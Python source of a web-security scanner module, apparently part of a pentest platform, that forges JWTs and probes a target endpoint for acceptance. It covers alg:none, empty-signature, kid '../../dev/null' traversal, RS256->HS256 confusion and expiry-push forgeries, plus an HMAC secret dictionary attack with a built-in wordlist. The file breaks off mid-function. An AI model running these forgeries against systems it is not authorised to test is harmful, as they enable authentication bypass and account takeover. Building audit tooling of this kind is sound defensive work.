"""jwt_forge_audit - JWT forge attack audit via VL-METHOD.

Phase D web credential-access scanner. Built 2026-06-05 on the
VL-METHOD 7-step pentest pattern (modeled on hydra_ssh_spray.py and
kerberoast_audit.py).

What this scanner is doing, in one paragraph
--------------------------------------------
Modern web apps hand the browser a signed JWT after login and rely on
server-side signature verification to authenticate every subsequent
request. A handful of well-known footguns in JWT libraries (alg:none
stripping, RS256->HS256 algorithm confusion, kid path traversal,
empty-signature short-circuit, expired-token replay) let an attacker
mint arbitrary tokens with no knowledge of the signing secret. This
scanner consumes a sample JWT (paste from browser DevTools) plus a
protected endpoint URL, then synthesizes forged tokens for each known
attack and probes the endpoint to see which (if any) are accepted. For
HS256/HS384/HS512 tokens it additionally runs a small dictionary attack
against the HMAC secret using the top-1000 leaked secrets list.

7 stages this scanner performs
------------------------------

  1. PRE-FLIGHT  - Inherit chain_creds (upstream exposed_env_scan may
                    have already found the jwt_secret), validate that
                    target + jwt_token are present, parse the token's
                    three base64url segments, decode header + payload
                    without signature verification.

  2. FINGERPRINT - Inspect header for alg/kid/jku/x5u/x5c hints and
                    payload for iss/sub/aud/exp/iat/role/admin claims.
                    HTTP-probe /.well-known/jwks.json to see if the
                    deployment is asymmetric-key (RS256/ES256).

  3. QUICK PROBE - Try 5 known JWT forge attacks serially:
                    (a) alg:none stripping
                    (b) empty signature segment
                    (c) kid path traversal -> /dev/null
                    (d) RS256->HS256 algorithm confusion
                    (e) expired-token replay (exp claim push)
                    Each forged token is sent to options.test_endpoint
                    via httpx; HTTP 200 on a token that should have been
                    rejected = preliminary finding.

  4. DEEP SCAN   - Gated on quick_probe hits OR options.always_deep.
                    For HS* algorithms, run a dictionary attack against
                    the HMAC secret: for each candidate secret in
                    options.secret_wordlist (or builtin top-1000),
                    re-sign the original payload and compare to the
                    original signature. Match = cracked secret. Hard
                    cap 1000 candidates + 5s wall-clock.

  5. VERIFY      - For each forge finding, re-send the forged token in
                    a NEW httpx request and confirm the endpoint
                    actually accepts it (response status 200 AND body
                    doesn't look like a 401/403 error page) -> CONFIRMED.
                    For cracked secrets, re-sign the original payload
                    with the cracked secret and verify byte-for-byte
                    signature match -> CONFIRMED.

  6. PRIVILEGE   - Inspect the forged payload's role/admin/scope claims:
                    role contains admin/root/superuser -> privilege=admin
                    admin: true bool                     -> privilege=admin
                    scope contains *  or admin:*         -> privilege=admin
                    role contains user/member             -> privilege=user
                    otherwise                              -> privilege=user

  7. CHAIN       - CONFIRMED admin-tier forge OR cracked HMAC with
                    admin payload -> chain_next includes
                    post_exploit_jwt_session_hijack.

Customer input via ScanRequest.options
--------------------------------------
  target           - base URL (from req.target, e.g. "https://app.acme.com")
  options.jwt_token       - REQUIRED sample JWT, paste from DevTools
  options.test_endpoint   - REQUIRED protected path (e.g. "/api/me")
  options.jwt_secret      - OPTIONAL known signing secret (skips brute)
  options.secret_wordlist - OPTIONAL newline-separated secrets
  options.public_key_url  - OPTIONAL URL to RSA public key for RS256
                             confusion attack (default: probe JWKS)
  options.always_deep     - OPTIONAL force deep_scan even on 0 quick hits
  options.show_plaintext  - OPTIONAL emit raw secrets in findings
  chain_creds             - INHERITED from upstream; first cred's pwd
                             treated as a candidate jwt_secret if
                             options.jwt_secret not supplied
"""
from __future__ import annotations

import asyncio
import base64
import hashlib
import hmac as hmac_mod
import json
import re
import time
from typing import Optional

from fastapi import APIRouter, Depends

from tools._shared import ScanRequest, verify_scan_quota
from tools._vl_core import ScanContext
from tools._methodology import MethodologyScanner, helpers
from tools._payloads.jwt_forge_audit_findings import (
    JWT_FORGE_AUDIT_FINDING_RULES,
    INTEL_FIELDS,
)

router = APIRouter()

# Hard caps - dictionary attack stays bounded so a 100k wordlist
# doesn't burn the scanner container
HARD_MAX_SECRETS = 1000
DEEP_SCAN_WALL_CLOCK_SEC = 5.0
HTTP_PROBE_TIMEOUT = 8.0

# Top-100 leaked / common JWT signing secrets. Trimmed from the public
# wordlists shipped with jwt_tool + jwt-cracker.
BUILTIN_TOP_SECRETS = [
    "secret", "secret123", "password", "password123", "jwt", "jwtsecret",
    "jwt_secret", "JWT_SECRET", "mysecret", "MySecret", "Secret123",
    "your-256-bit-secret", "your-secret", "your_jwt_secret", "supersecret",
    "supersecretkey", "superSecret", "topsecret", "TopSecret", "p@ssw0rd",
    "P@ssw0rd", "P@ssword", "Password123", "Passw0rd", "passw0rd",
    "admin", "Admin", "admin123", "Admin123", "administrator",
    "test", "Test", "test123", "testing", "TestSecret", "dev", "dev123",
    "development", "Development", "production", "prod", "prod123",
    "qa", "staging", "stage",
    "changeme", "ChangeMe", "changeit", "default", "Default",
    "jwt-secret", "jwt-key", "key", "key123", "private", "Private",
    "private-key", "privateKey", "publicKey", "public-key", "publickey",
    "qwerty", "qwerty123", "abc123", "123456", "12345678", "letmein",
    "welcome", "Welcome", "welcome123", "Welcome123",
    "company", "company-secret", "acme", "acme-secret",
    "vault", "vault-secret", "auth", "auth-secret", "Auth", "AUTH_SECRET",
    "jsonwebtoken", "node-jwt", "express-jwt", "fastapi-jwt",
    "django-secret", "django-key", "rails-secret", "spring-jwt",
    "hmac", "hmac-key", "hmac-secret", "shared-secret", "shared",
    "myjwt", "myjwtkey", "mykey", "MyKey", "mykey123",
    "secret_key", "SECRET_KEY", "secret-key", "SECRETKEY", "secretkey",
    "Secretsecret", "SuperSecret123", "iloveyou", "monkey", "dragon",
    "master", "Master", "master123", "root", "root123",
    "google", "facebook", "twitter", "github",
    "hello", "hello123", "world", "helloworld",
    "8d20bd7bff8f0c5b2a3d4f5e6a7b8c9d", "deadbeef", "cafebabe",
    "12345", "1234567890", "abcdef", "abcd1234",
    "veryverysecret", "very_very_secret", "super-super-secret",
    "thisisasecret", "thisisthesecret", "thisismysecret",
]


class JwtForgeAuditRequest(ScanRequest):
    options: Optional[dict] = None


# ════════════════════════════════════════════════════════════════════
#  Redaction helpers
# ════════════════════════════════════════════════════════════════════


def _redact(secret: str, show_plaintext: bool = False) -> str:
    """Customer-safe redaction for HMAC secrets (NOT for the JWT token).

    Default returns "len<N>_hash<sha256_8>" - stable shape that lets
    multi-tenant reports show "secret cracked" with auditability
    (same secret -> same marker) but no crackable material.

    show_plaintext=True (customer scanning own infra) returns the raw
    plaintext so they can feed it into their secret-rotation tooling."""
    if not secret:
        return "len0_hash00000000"
    if show_plaintext:
        return secret
    digest = hashlib.sha256(secret.encode("utf-8", errors="ignore")).hexdigest()[:8]
    return f"len{len(secret)}_hash{digest}"


def _redact_token(token: str, show_plaintext: bool = False) -> str:
    """Token-specific redaction. JWT format is <header>.<payload>.<sig>;
    payload is base64url-encoded JSON and often contains PII (email,
    user_id, tenant_id). We expose the header (so the report shows the
    algorithm + kid being attacked) but redact payload + sig.

    show_plaintext=True returns the full token."""
    if not token:
        return ""
    if show_plaintext:
        return token
    parts = token.split(".")
    if len(parts) != 3:
        return "<malformed>"
    header_b64 = parts[0]
    sig = parts[2] or ""
    sig_short = sig[:8] if sig else "no_sig"
    return f"{header_b64}.***.{sig_short}"


# ════════════════════════════════════════════════════════════════════
#  Base64url helpers (PyJWT compatible without depending on internals)
# ════════════════════════════════════════════════════════════════════


def _b64url_decode(s: str) -> bytes:
    """Base64url decode with implicit padding fix."""
    if not s:
        return b""
    s = s.split(".")[0]
    pad = "=" * (-len(s) % 4)
    return base64.urlsafe_b64decode(s + pad)


def _b64url_encode(b: bytes) -> str:
    """Base64url encode stripping padding."""
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode("ascii")


def _validate_jwt_shape(token: str) -> bool:
    """Verify token has exactly 3 base64url-encoded parts."""
    if not token or token.count(".") != 2:
        return False
    parts = token.split(".")
    if len(parts) != 3:
        return False
    # header + payload must each be non-empty + decodable b64url
    for seg in parts[:2]:
        if not seg:
            return False
        try:
            _b64url_decode(seg)
        except Exception:
            return False
    return True


# ════════════════════════════════════════════════════════════════════
#  JwtForgeAudit - the VL-METHOD scanner class
# ════════════════════════════════════════════════════════════════════


class JwtForgeAudit(MethodologyScanner):
    name = "jwt_forge_audit"

    # ── STAGE 1: PRE-FLIGHT ──────────────────────────────────────
    async def pre_flight(self, ctx: ScanContext) -> bool:
        opts = ctx.state.get("_options") or {}

        # Inherit jwt_secret from chain_creds if upstream scanner found one
        if not opts.get("jwt_secret") and (opts.get("chain_creds") or []):
            cred = (opts.get("chain_creds") or [{}])[0] or {}
            if cred.get("pwd"):
                opts["jwt_secret"] = cred["pwd"]
                ctx.state["_options"] = opts

        target = (ctx.host or "").strip()
        token = (opts.get("jwt_token") or "").strip()
        # Allow customer to paste "Bearer eyJ..." by stripping prefix
        if token.lower().startswith("bearer "):
            token = token[7:].strip()
            opts["jwt_token"] = token
            ctx.state["_options"] = opts

        # Check PyJWT availability up-front
        try:
            import jwt  # noqa: F401
            ctx.state["_jwt_lib_ok"] = True
        except ImportError:
            ctx.state["jwt_lib_missing"] = True
            ctx.state["skipped_reason"] = (
                "PyJWT library not installed - cannot decode/forge tokens")
            return False

        if not target or not token:
            ctx.state["skipped_reason"] = (
                "requires target URL + options.jwt_token")
            return False

        if not _validate_jwt_shape(token):
            ctx.state["skipped_reason"] = "jwt_token malformed (expected 3 base64url parts)"
            return False

        # Decode header + payload without signature verification
        import jwt
        try:
            header = jwt.get_unverified_header(token)
        except Exception as e:
            ctx.state["skipped_reason"] = f"jwt_token malformed (header decode: {type(e).__name__})"
            return False
        try:
            payload = jwt.decode(token, options={"verify_signature": False})
        except Exception:
            # Fallback: decode payload segment manually
            try:
                payload_bytes = _b64url_decode(token.split(".")[1])
                payload = json.loads(payload_bytes.decode("utf-8", errors="ignore"))
            except Exception as e:
                ctx.state["skipped_reason"] = f"jwt_token malformed (payload decode: {type(e).__name__})"
                return False

        ctx.state["jwt_header"] = header if isinstance(header, dict) else {}
        ctx.state["jwt_payload"] = payload if isinstance(payload, dict) else {}
        ctx.state["target"] = target
        # Capture original signature segment for later HMAC compare
        ctx.state["_orig_token"] = token
        ctx.state["_orig_sig"] = token.split(".")[2] if "." in token else ""
        return True

    # ── STAGE 2: FINGERPRINT ─────────────────────────────────────
    async def fingerprint(self, ctx: ScanContext):
        header = ctx.state.get("jwt_header") or {}
        payload = ctx.state.get("jwt_payload") or {}

        alg = (header.get("alg") or "").upper()
        # Build claims list (which standard + custom claims are present)
        claims = sorted(payload.keys()) if isinstance(payload, dict) else []
        # Detect admin/role markers
        role_val = ""
        if isinstance(payload.get("role"), str):
            role_val = payload["role"]
        elif isinstance(payload.get("roles"), list) and payload["roles"]:
            role_val = ",".join(str(r) for r in payload["roles"])
        admin_flag = bool(payload.get("admin")) or bool(payload.get("is_admin"))

        # Detect exp claim
        exp_val = payload.get("exp")
        try:
            expires_at = int(exp_val) if exp_val is not None else None
        except (TypeError, ValueError):
            expires_at = None

        fp = {
            "algorithm": alg,
            "has_kid": "kid" in header,
            "has_jku": "jku" in header,
            "has_x5u": "x5u" in header,
            "has_x5c": "x5c" in header,
            "claims": claims,
            "payload_has_role": bool(role_val),
            "payload_has_admin_flag": admin_flag,
            "expires_at": expires_at,
            "role_value": role_val,
            "subject": str(payload.get("sub") or ""),
            "issuer": str(payload.get("iss") or ""),
            "audience": str(payload.get("aud") or ""),
        }

        # HTTP-probe JWKS endpoint to see if asymmetric-key system
        target = (ctx.state.get("target") or "").rstrip("/")
        jwks_url = f"{target}/.well-known/jwks.json"
        jwks_present = False
        try:
            import httpx
            async with httpx.AsyncClient(verify=False, timeout=4.0,
                                          follow_redirects=False) as client:
                r = await client.get(jwks_url)
                if r.status_code == 200 and ("keys" in (r.text or "").lower()):
                    jwks_present = True
        except Exception:
            pass
        fp["jwks_endpoint_present"] = jwks_present

        ctx.state["fingerprint"] = fp

    # ── STAGE 3: QUICK PROBE (5 forge attacks) ───────────────────
    async def quick_probe(self, ctx: ScanContext) -> list[dict]:
        opts = ctx.state.get("_options") or {}
        show = bool(opts.get("show_plaintext"))
        test_endpoint = (opts.get("test_endpoint") or "").strip()
        # If no test_endpoint, we can still STRUCTURALLY forge but cannot
        # verify acceptance - quick_probe yields zero findings, deep_scan
        # may still try HMAC brute since that uses signature compare
        ctx.state["quick_probe_attempts"] = 5
        ctx.state["quick_probe_hits"] = 0
        if not test_endpoint:
            ctx.state["quick_probe_skipped"] = (
                "options.test_endpoint not supplied - cannot probe acceptance")
            return []

        header = ctx.state.get("jwt_header") or {}
        payload = ctx.state.get("jwt_payload") or {}
        target = (ctx.state.get("target") or "").rstrip("/")
        endpoint_url = (
            test_endpoint if test_endpoint.startswith("http")
            else target + (test_endpoint if test_endpoint.startswith("/") else "/" + test_endpoint))
        ctx.state["_test_endpoint_url"] = endpoint_url

        # Baseline: request the endpoint with NO token to see what
        # "unauthorized" looks like. Accept code != 200 as the baseline.
        baseline_status, baseline_len = await self._http_probe(endpoint_url, token=None)
        ctx.state["baseline_no_token_status"] = baseline_status
        ctx.state["baseline_no_token_body_len"] = baseline_len

        findings: list[dict] = []

        # ── attack (a): alg:none stripping ──
        a_token = self._forge_alg_none(header, payload)
        if a_token:
            status, body_len = await self._http_probe(endpoint_url, token=a_token)
            accepted = self._looks_accepted(status, body_len, baseline_status, baseline_len)
            findings.append({
                "id": "qp_alg_none",
                "kind": "alg_none",
                "attack_label": "alg:none signature stripping",
                "forged_token_marker": _redact_token(a_token, show_plaintext=show),
                "probe_status": status,
                "endpoint_accepted": accepted,
                "discovery_method": "alg_none_strip",
                "_forged_token_private": a_token,
            })
            if accepted:
                ctx.state["quick_probe_hits"] += 1

        # ── attack (b): empty signature ──
        b_token = self._forge_empty_sig(header, payload)
        if b_token:
            status, body_len = await self._http_probe(endpoint_url, token=b_token)
            accepted = self._looks_accepted(status, body_len, baseline_status, baseline_len)
            findings.append({
                "id": "qp_empty_sig",
                "kind": "empty_sig",
                "attack_label": "empty signature segment",
                "forged_token_marker": _redact_token(b_token, show_plaintext=show),
                "probe_status": status,
                "endpoint_accepted": accepted,
                "discovery_method": "empty_signature",
                "_forged_token_private": b_token,
            })
            if accepted:
                ctx.state["quick_probe_hits"] += 1

        # ── attack (c): kid path traversal -> /dev/null (empty HMAC key) ──
        c_token = self._forge_kid_traversal(header, payload)
        if c_token:
            status, body_len = await self._http_probe(endpoint_url, token=c_token)
            accepted = self._looks_accepted(status, body_len, baseline_status, baseline_len)
            findings.append({
                "id": "qp_kid_traversal",
                "kind": "kid_traversal",
                "attack_label": "kid path traversal -> /dev/null",
                "forged_token_marker": _redact_token(c_token, show_plaintext=show),
                "probe_status": status,
                "endpoint_accepted": accepted,
                "discovery_method": "kid_path_traversal",
                "_forged_token_private": c_token,
            })
            if accepted:
                ctx.state["quick_probe_hits"] += 1

        # ── attack (d): RS256 -> HS256 confusion ──
        # Only attempt if original is RS256 / RS384 / RS512
        if (header.get("alg") or "").upper() in ("RS256", "RS384", "RS512"):
            public_key_pem = await self._fetch_public_key(opts, target)
            if public_key_pem:
                d_token = self._forge_alg_confusion(header, payload, public_key_pem)
                if d_token:
                    status, body_len = await self._http_probe(endpoint_url, token=d_token)
                    accepted = self._looks_accepted(status, body_len, baseline_status, baseline_len)
                    findings.append({
                        "id": "qp_alg_confusion",
                        "kind": "alg_confusion",
                        "attack_label": "RS256->HS256 confusion (pubkey as HMAC secret)",
                        "forged_token_marker": _redact_token(d_token, show_plaintext=show),
                        "probe_status": status,
                        "endpoint_accepted": accepted,
                        "discovery_method": "rs_to_hs_confusion",
                        "_forged_token_private": d_token,
                    })
                    if accepted:
                        ctx.state["quick_probe_hits"] += 1

        # ── attack (e): expired token replay (push exp +1y, empty secret) ──
        e_token = self._forge_expired_replay(header, payload)
        if e_token:
            status, body_len = await self._http_probe(endpoint_url, token=e_token)
            accepted = self._looks_accepted(status, body_len, baseline_status, baseline_len)
            findings.append({
                "id": "qp_expired_replay",
                "kind": "expired_replay",
                "attack_label": "expired token replay (exp pushed)",
                "forged_token_marker": _redact_token(e_token, show_plaintext=show),
                "probe_status": status,
                "endpoint_accepted": accepted,
                "discovery_method": "expired_replay",
                "_forged_token_private": e_token,
            })
            if accepted:
                ctx.state["quick_probe_hits"] += 1

        return findings

    # ── STAGE 4: DEEP SCAN (HMAC dictionary attack) ──────────────
    async def deep_scan(self, ctx: ScanContext) -> list[dict]:
        opts = ctx.state.get("_options") or {}
        header = ctx.state.get("jwt_header") or {}
        payload = ctx.state.get("jwt_payload") or {}
        orig_sig = ctx.state.get("_orig_sig") or ""
        orig_token = ctx.state.get("_orig_token") or ""
        show = bool(opts.get("show_plaintext"))
        alg = (header.get("alg") or "").upper()

        # Gate: must be symmetric HMAC algorithm
        if alg not in ("HS256", "HS384", "HS512"):
            ctx.state["jwt_brute_attempts"] = 0
            ctx.state["deep_skipped"] = f"alg={alg} not HMAC - skipping secret brute force"
            return []
        if not orig_token or not orig_sig:
            ctx.state["jwt_brute_attempts"] = 0
            return []

        findings: list[dict] = []

        # Fast path: customer supplied jwt_secret directly
        explicit_secret = opts.get("jwt_secret")
        if explicit_secret:
            if self._hmac_sig_matches(orig_token, str(explicit_secret), alg):
                findings.append({
                    "id": "deep_supplied",
                    "kind": "jwt_secret_cracked",
                    "algorithm": alg,
                    "secret_marker": _redact(str(explicit_secret), show_plaintext=show),
                    "discovery_method": "customer_supplied_secret_verified",
                    "_secret_private": str(explicit_secret),
                })
                ctx.state["jwt_brute_attempts"] = 1
                return findings
            # else fall through to dictionary attack

        # Build candidate list
        wordlist_raw = (opts.get("secret_wordlist") or "").strip()
        if wordlist_raw:
            candidates: list[str] = []
            seen: set[str] = set()
            for line in wordlist_raw.splitlines():
                v = line.strip()
                if v and v not in seen:
                    seen.add(v)
                    candidates.append(v)
                if len(candidates) >= HARD_MAX_SECRETS:
                    break
        else:
            candidates = list(BUILTIN_TOP_SECRETS)

        # Also try the chain-inherited secret as first candidate
        if explicit_secret and str(explicit_secret) not in candidates:
            candidates.insert(0, str(explicit_secret))

        candidates = candidates[:HARD_MAX_SECRETS]
        ctx.state["jwt_brute_attempts"] = 0

        # Run dictionary attack with hard wall-clock cap
        loop = asyncio.get_event_loop()
        deadline = time.time() + DEEP_SCAN_WALL_CLOCK_SEC

        def _brute_sync():
            cracked: list[str] = []
            tried = 0
            for cand in candidates:
                if time.time() > deadline:
                    break
                tried += 1
                if self._hmac_sig_matches(orig_token, cand, alg):
                    cracked.append(cand)
                    # Stop on first hit - one secret is enough
                    break
            return (tried, cracked)

        try:
            tried, cracked = await loop.run_in_executor(None, _brute_sync)
        except Exception:
            tried, cracked = (0, [])

        ctx.state["jwt_brute_attempts"] = tried

        for i, secret in enumerate(cracked):
            findings.append({
                "id": f"deep_brute_{i}",
                "kind": "jwt_secret_cracked",
                "algorithm": alg,
                "secret_marker": _redact(secret, show_plaintext=show),
                "discovery_method": "hmac_dictionary_attack",
                "_secret_private": secret,
            })
        return findings

    # ── STAGE 5: VERIFY ──────────────────────────────────────────
    async def verify(self, ctx: ScanContext, finding: dict) -> Optional[dict]:
        # VL-FOUNDRY evidence surfacing: stamp a concrete, per-finding
        # evidence string onto the methodology finding object. This rides
        # into the report via the methodology_findings intel field; it adds
        # no new finding and changes no severity (advisory-by-design safe).
        finding["evidence_marker"] = (
            f"{finding.get('discovery_method') or finding.get('kind') or 'probe'}"
            f" -> verifying {finding.get('kind') or 'finding'} for "
            f"{finding.get('user') or finding.get('attack_label') or ctx.host}")
        kind = finding.get("kind") or ""
        opts = ctx.state.get("_options") or {}
        endpoint_url = ctx.state.get("_test_endpoint_url") or ""
        baseline_status = ctx.state.get("baseline_no_token_status")
        baseline_len = ctx.state.get("baseline_no_token_body_len")

        # ── Cracked HMAC secret: re-sign payload, byte-compare signature
        if kind == "jwt_secret_cracked":
            orig_token = ctx.state.get("_orig_token") or ""
            secret = finding.get("_secret_private") or ""
            alg = (finding.get("algorithm") or "").upper()
            if self._hmac_sig_matches(orig_token, secret, alg):
                finding["confidence"] = "CONFIRMED"
                finding["verification_method"] = "hmac_signature_recomputed_match"
            else:
                finding["confidence"] = "SUSPECTED"
                finding["verification_method"] = "hmac_recompute_mismatch"
            return finding

        # ── Forge findings: re-send forged token in NEW request, confirm
        forged_token = finding.get("_forged_token_private") or ""
        if not forged_token or not endpoint_url:
            finding["confidence"] = "SUSPECTED"
            finding["verification_method"] = "no_endpoint_or_token_to_reverify"
            return finding

        status, body_len = await self._http_probe(endpoint_url, token=forged_token)
        finding["verify_probe_status"] = status
        accepted_now = self._looks_accepted(status, body_len,
                                             baseline_status, baseline_len)
        if accepted_now:
            finding["confidence"] = "CONFIRMED"
            finding["verification_method"] = "forged_jwt_accepted_by_endpoint"
        else:
            # If quick_probe initially flagged accepted but re-probe rejected,
            # downgrade to SUSPECTED for manual review
            if finding.get("endpoint_accepted"):
                finding["confidence"] = "SUSPECTED"
                finding["verification_method"] = "first_probe_accepted_second_rejected"
            else:
                finding["confidence"] = "SUSPECTED"
                finding["verification_method"] = "endpoint_did_not_accept_forged_token"
        return finding

    # ── STAGE 6: PRIVILEGE CHECK ─────────────────────────────────
    async def privilege_check(self, ctx: ScanContext, finding: dict) -> dict:
        payload = ctx.state.get("jwt_payload") or {}
        finding["privilege"] = self._classify_privilege(payload)
        return finding

    # ── STAGE 7: CHAIN HANDOFF ───────────────────────────────────
    async def chain_handoff(self, ctx: ScanContext, findings: list[dict]) -> list[str]:
        next_scanners: list[str] = []
        admin_confirmed = False
        cracked_admin = False
        for f in findings:
            if f.get("confidence") != "CONFIRMED":
                continue
            if f.get("kind") == "jwt_secret_cracked" and f.get("privilege") == "admin":
                cracked_admin = True
            elif f.get("kind") != "jwt_secret_cracked" and f.get("privilege") == "admin":
                admin_confirmed = True
        if admin_confirmed or cracked_admin:
            next_scanners = ["post_exploit_jwt_session_hijack"]
            for f in findings:
                if f.get("confidence") == "CONFIRMED" and f.get("privilege") == "admin":
                    f["chain_next"] = list(next_scanners)
        return next_scanners

    # ── INTERNAL HELPERS ─────────────────────────────────────────

    @staticmethod
    def _looks_accepted(status: Optional[int], body_len: Optional[int],
                         baseline_status: Optional[int],
                         baseline_len: Optional[int]) -> bool:
        """Heuristic: forged token is accepted if response is 200, OR
        differs from the no-token baseline in a way suggesting auth
        succeeded (e.g. baseline was 401 but forged returned 200/302)."""
        if status is None:
            return False
        if status == 200:
            return True
        # 302 redirect away from /login is often an accept
        if status in (301, 302, 303) and baseline_status in (401, 403):
            return True
        # If baseline returned 401 but forged returned anything else 2xx, accept
        if baseline_status in (401, 403) and 200 <= status < 300:
            return True
        return False

    async def _http_probe(self, url: str, token: Optional[str]) -> tuple[Optional[int], Optional[int]]:
        """Send a GET to url with Authorization: Bearer <token> (or no
        Authorization if token=None). Returns (status_code, body_length).
        Failures return (None, None) so the caller can treat as 'not accepted'."""
        try:
            import httpx
        except ImportError:
            return (None, None)
        headers = {}
        if token:
            headers["Authorization"] = f"Bearer {token}"
        try:
            async with httpx.AsyncClient(verify=False,
                                          timeout=HTTP_PROBE_TIMEOUT,
                                          follow_redirects=False) as client:
                r = await client.get(url, headers=headers)
                return (r.status_code, len(r.content or b""))
        except Exception:
            return (None, None)

    async def _fetch_public_key(self, opts: dict, target: str) -> str:
        """Fetch RSA public key for alg-confusion attack.
        Order:
          1. options.public_key_url (customer-supplied)
          2. options.public_key (PEM string supplied directly)
          3. {target}/.well-known/jwks.json -> first RSA key converted to PEM
        Returns empty string on failure."""
        if opts.get("public_key"):
            return str(opts["public_key"])
        try:
            import httpx
        except ImportError:
            return ""
        candidate_urls = []
        if opts.get("public_key_url"):
            candidate_urls.append(str(opts["public_key_url"]))
        candidate_urls.append(f"{target.rstrip('/')}/.well-known/jwks.json")
        for url in candidate_urls:
            try:
                async with httpx.AsyncClient(verify=False, timeout=4.0,
                                              follow_redirects=True) as client:
                    r = await client.get(url)
                if r.status_code != 200:
                    continue
                text = r.text or ""
                # Direct PEM
                if "BEGIN PUBLIC KEY" in text or "BEGIN RSA PUBLIC KEY" in text:
                    return text
                # JWKS - parse first RSA key
                try:
                    j = r.json()
                except Exception:
                    continue
                keys = j.get("keys") or []
                if not keys:
                    continue
                # Convert first JWK n/e to PEM via cryptography if available
                jwk = keys[0]
                if jwk.get("kty") == "RSA" and jwk.get("n") and jwk.get("e"):
                    pem = self._jwk_rsa_to_pem(jwk)
                    if pem:
                        return pem
            except Exception:
                continue
        return ""

    @staticmethod
    def _jwk_rsa_to_pem(jwk: dict) -> str:
        """Convert an RSA JWK {n, e} to a PEM SubjectPublicKeyInfo string."""
        try:
            from cryptography.hazmat.primitives.asymmetric.rsa import RSAPublicNumbers
            from cryptography.hazmat.primitives import serialization
        except ImportError:
            return ""
        try:
            def _int_from_b64url(s: str) -> int:
                raw = _b64url_decode(s)
                return int.from_bytes(raw, "big")
            n = _int_from_b64url(jwk["n"])
            e = _int_from_b64url(jwk["e"])
            pub_numbers = RSAPublicNumbers(e=e, n=n)
            pub_key = pub_numbers.public_key()
            pem = pub_key.public_bytes(
                encoding=serialization.Encoding.PEM,
                format=serialization.PublicFormat.SubjectPublicKeyInfo)
            return pem.decode("ascii")
        except Exception:
            return ""

    @staticmethod
    def _hmac_sig_matches(orig_token: str, secret: str, alg: str) -> bool:
        """Re-sign the signing-input portion of orig_token with secret
        (using alg's HMAC variant), compare to original signature.
        Returns True on byte match."""
        if not orig_token or orig_token.count(".") != 2:
            return False
        signing_input = orig_token.rsplit(".", 1)[0]
        orig_sig_b64 = orig_token.rsplit(".", 1)[1]
        try:
            orig_sig_bytes = _b64url_decode(orig_sig_b64)
        except Exception:
            return False
        digestmod = {"HS256": hashlib.sha256,
                     "HS384": hashlib.sha384,
                     "HS512": hashlib.sha512}.get(alg.upper())
        if not digestmod:
            return False
        try:
            computed = hmac_mod.new(
                secret.encode("utf-8", errors="ignore"),
                signing_input.encode("ascii", errors="ignore"),
                digestmod).digest()
        except Exception:
            return False
        try:
            return hmac_mod.compare_digest(computed, orig_sig_bytes)
        except Exception:
            return computed == orig_sig_bytes

    @staticmethod
    def _forge_alg_none(header: dict, payload: dict) -> str:
        """Build token with alg=none + empty signature."""
        try:
            new_header = dict(header or {})
            new_header["alg"] = "none"
            new_header.pop("kid", None)
            h_b64 = _b64url_encode(json.dumps(new_header, separators=(",", ":")).encode("utf-8"))
            p_b64 = _b64url_encode(json.dumps(payload or {}, separators=(",", ":")).encode("utf-8"))
            return f"{h_b64}.{p_b64}."
        except Exception:
            return ""

    @staticmethod
    def _forge_empty_sig(header: dict, payload: dict) -> str:
        """Build token with original alg but empty signature segment."""
        try:
            new_header = dict(header or {})
            # Keep alg as-is, signature segment empty
            h_b64 = _b64url_encode(json.dumps(new_header, separators=(",", ":")).encode("utf-8"))
            p_b64 = _b64url_encode(json.dumps(payload or {}, separators=(",", ":")).encode("utf-8"))
            return f"{h_b64}.{p_b64}."
        except Exception:
            return ""

    @staticmethod
    def _forge_kid_traversal(header: dict, payload: dict) -> str:
        """Build token with kid=/dev/null (or path traversal), HMAC-signed
        with empty bytes (because /dev/null is empty)."""
        try:
            new_header = dict(header or {})
            new_header["alg"] = "HS256"
            new_header["kid"] = "../../../../../../dev/null"
            h_b64 = _b64url_encode(json.dumps(new_header, separators=(",", ":")).encode("utf-8"))
            p_b64 = _b64url_encode(json.dumps(payload or {}, separators=(",", ":")).encode("utf-8"))
            signing_input = f"{h_b64}.{p_b64}"
            # HMAC with empty key bytes (what /dev/null produces)
            sig = hmac_mod.new(b"", signing_input.encode("ascii"),
                                hashlib.sha256).digest()
            return f"{signing_input}.{_b64url_encode(sig)}"
        except Exception:
            return ""

    @staticmethod
    def _forge_alg_confusion(header: dict, payload: dict, public_key_pem: str) -> str:
        """Build token with alg=HS256, using the RSA public key text as
        the HMAC secret. Naive verifiers that pass the same key to both
        algorithms will accept this."""
        try:
            new_header = dict(header or {})
            new_header["alg"] = "HS256"
            h_b64 = _b64url_encode(json.dumps(new_header, separators=(",", ":")).encode("utf-8"))
            p_b64 = _b64url_encode(json.dumps(payload or {}, separators=(",", ":")).encode("utf-8"))
            signing_input = f"{h_b64}.{p_b64}"
            # Use the full PEM (including BEGIN/END markers + newlines)
            # as the HMAC key - matches the canonical exploit
            sig = hmac_mod.new(public_key_pem.encode("utf-8"),
                                signing_input.encode("ascii"),
                                hashlib.sha256).digest()
            return f"{signing_input}.{_b64url_encode(sig)}"
        except Exception:
            return ""

    @staticmethod
    def _forge_expired_replay(header: dict, payload: dict) -> str:
        """Push exp claim 1 year into the future, re-sign with empty
        HMAC secret (catches verifiers that only check exp without
        verifying signature)."""
        try:
            new_header = dict(header or {})
            new_header["alg"] = "HS256"
            new_payload = dict(payload or {})
            new_payload["exp"] = int(time.time()) + 31536000  # +1 year
            h_b64 = _b64url_encode(json.dumps(new_header, separators=(",", ":")).encode("utf-8"))
            p_b64 = _b64url_encode(json.dumps(new_payload, separators=(",", ":")).encode("utf-8"))
            signing_input = f"{h_b64}.{p_b64}"
            sig = hmac_mod.new(b"", signing_input.encode("ascii"),
                                hashlib.sha256).digest()
            return f"{signing_input}.{_b64url_encode(sig)}"
        except Exception:
            return ""

    @staticmethod
    def _classify_privilege(payload: dict) -> str:
        """Inspect payload claims for privilege tier.
        Returns 'admin' | 'user'."""
        if not isinstance(payload, dict):
            return "user"
        # role string / list
        role_raw = payload.get("role") or payload.get("roles") or ""
        role_str = ""
        if isinstance(role_raw, str):
            role_str = role_raw.lower()
        elif isinstance(role_raw, list):
            role_str = " ".join(str(r).lower() for r in role_raw)
        for needle in ("admin", "root", "superuser", "superadmin", "owner"):
            if needle in role_str:
                return "admin"

        # admin / is_admin boolean
        if bool(payload.get("admin")) or bool(payload.get("is_admin")):
            return "admin"

        # scope claim
        scope_raw = payload.get("scope") or payload.get("scopes") or ""
        scope_str = ""
        if isinstance(scope_raw, str):
